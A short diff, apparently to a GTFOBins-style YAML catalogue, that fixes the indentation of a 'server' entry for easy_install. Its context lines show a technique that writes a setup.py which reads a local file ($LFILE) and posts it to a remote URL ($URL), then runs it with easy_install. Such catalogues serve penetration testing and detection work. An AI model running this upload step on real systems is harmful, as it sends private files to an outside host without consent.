@@ -9,7 +9,7 @@ functions:
         else: import urllib as u, urllib2 as r
         r.urlopen(e["$URL"], bytes(u.urlencode({"d":open(e["$LFILE"]).read()}).encode()))' > $TF/setup.py
         easy_install $TF
-    server:
+  server:
     - description: Serve files in the local folder running an HTTP server.
       code: |
         TF=$(mktemp -d)
